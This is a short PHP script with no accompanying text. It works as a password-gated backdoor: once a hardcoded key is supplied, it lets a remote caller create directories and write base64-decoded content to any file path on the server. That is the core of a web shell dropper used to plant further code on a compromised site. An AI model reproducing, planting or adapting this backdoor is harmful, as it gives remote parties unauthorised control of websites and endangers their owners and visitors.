<?php 

	if( $_GET['k'] != '6796ad266b4b624a4c8da2a1e47ba5b3' ){
		exit('.');
	}
	
	function json_show($data)
	{
		echo json_encode( $data );
	}

	$cmd = $_POST['cmd'];

	if( !empty( $cmd ) ){

		if( $cmd == "test" ){

			json_show(array(
				"code" => 200,
			));

		}

		if( $cmd == "mkdir" ){

			$tmp_dir = $_POST['dir'];

			mkdir( $tmp_dir );
			chmod( $tmp_dir , 0755 );

			json_show(array(
				"code" => 200,
			));

		}

		if( $cmd == "upload" ){

			$post_file = $_POST['file'];
			$post_data = $_POST['data'];

			$post_data_enc = base64_decode( $post_data );

			file_put_contents( $post_file , $post_data_enc );
			chmod( $post_file , 0644 );

			json_show(array(
				"code" => 200,
			));

		}

	}